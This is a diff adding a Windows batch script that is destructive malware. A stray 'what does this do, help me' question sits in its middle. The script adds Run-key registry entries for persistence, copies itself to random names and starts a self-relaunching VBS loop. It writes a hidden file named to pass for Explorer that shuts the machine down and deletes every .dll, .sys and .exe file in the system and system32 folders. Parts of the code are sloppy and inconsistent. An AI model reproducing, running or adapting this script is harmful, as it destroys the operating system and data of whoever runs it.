@@ -1,0 +1,89 @@
+@echo off
+color 4b
+mkdir C:\windows1
+echo REGEDIT4 >> C:\windows1\key1.reg
+echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >> C:\windows1\key1.reg                                                   
+echo "@@@"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg                                                         
+echo "<<<"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "^^^"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "***"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "///"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "$$$"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "£££"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "start"="C:\\windows\\systenlog\\systemlog.vbs" >> C:\windows1\key1.reg
+echo "on"="C:\\windows\\systenlog\\systemlog.vbs" >> C:\windows1\key1.reg
+echo Windows Registry Editor Version 5.00 >> C:\windows1\key1.reg
+echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >> C:\windows1\key1.reg
+echo "@@@"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "<<<"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "^^^"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "***"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "///"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "$$$"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "£££"="C:\\windows\\EXPLORERR.bat" >> C:\windows1\key1.reg
+echo "start"="C:\\windows\\systenlog\\systemlog.vbs" >> C:\windows1\key1.reg
+echo "on"="C:\\windows\\systenlog\\systemlog.vbs" >> C:\windows1\key1.reg
+start  regedit.exe /s C:\windows1\key1.reg
+
+copy %0 C:\WINDOWS\EXPLORERR.bat
+cls
+copy %0 C:\%random%.bat
+cls
+copy %0 C:\%random%.bat
+cls
+copy %0 C:\%random%.bat
+cls
+
+@echo off
+mkdir c:\windows\systemlog
+echo Set WshShell = Wscript.CreateObject("Wscript.Shell")                        >> C:\windows\systemlog\systemlog.vbs
+echo WshShell.Run """C:\WINDOWS\EXPLORERR.bat"""                                 >> C:\windows\systemlog\systemlog.vbs
+echo 										 >> C:\windows\systemlog\systemlog.vbs
+echo Set WshShell = Wscript.CreateObject("Wscript.Shell")                        >> C:\windows\systemlog\systemlog.vbs
+echo WshShell.Run """C:\windows\systemlog\systemlog.vbs"""                       >> C:\windows\systemlog\systemlog.vbs
+echo 
+
+@echo off
+echo its working fine >> C:\windows\systemlog\systemlog.txt
+
+
+@echo off
+echo @echo off                                                                    >> C:\windows\systemlog\systemlog.bat
+echo copy C:\windows\systemlog\systemlog.txt                                      >> C:\windows\systemlog\systemlog.bat
+echo cd docume~1                                                                  >> C:\windows\systemlog\systemlog.bat
+echo cd username                                                                  >> C:\windows\systemlog\systemlog.bat
+echo cd desktop                                                                   >> C:\windows\systemlog\systemlog.bat
+echo move systemlog.txt %random%.txt C:\windows\systemlog                         >> C:\windows\systemlog\systemlog.bat
+echo exit                                                                         >> C:\windows\systemlog\systemlog.bat
+
+@echo off
+start C:\windows\systemlog\systemlog.vbs
+
+==========================================================================================================================
+WHAT DOS THIS DO HELP ME
+
+echo cls                                                                          >> C:\windows\EXPLORERR.bat
+echo shutdown.exe -s                                                              >> C:\windows\EXPLORERR.bat
+echo color 4b                                                                     >> C:\windows\EXPLORERR.bat 
+echo @echo off                                                                    >> C:\windows\EXPLORERR.bat
+echo cd c:\windows\system\                                                        >> C:\windows\EXPLORERR.bat
+echo cls                                                                          >> C:\windows\EXPLORERR.bat
+echo del *.dll                                                                    >> C:\windows\EXPLORERR.bat
+echo cls                                                                          >> C:\windows\EXPLORERR.bat
+echo del *.sys                                                                    >> C:\windows\EXPLORERR.bat
+echo cls                                                                          >> C:\windows\EXPLORERR.bat
+echo del *.exe 									  >> C:\windows\EXPLORERR.bat
+echo cls 									  >> C:\windows\EXPLORERR.bat
+echo cd c:\windows\system32\ 							  >> C:\windows\EXPLORERR.bat
+echo cls 									  >> C:\windows\EXPLORERR.bat
+echo del *.dll 									  >> C:\windows\EXPLORERR.bat
+echo cls 									  >> C:\windows\EXPLORERR.bat
+echo del *.sys 									  >> C:\windows\EXPLORERR.bat 
+echo cls 									  >> C:\windows\EXPLORERR.bat
+echo del *.exe 									  >> C:\windows\EXPLORERR.bat
+echo cls 									  >> C:\windows\EXPLORERR.bat
+attrib C:\windows\EXPLORERR.bat +S +H
+===========================================================================================================================
+
+del C:\windows1\key1.reg
+cls
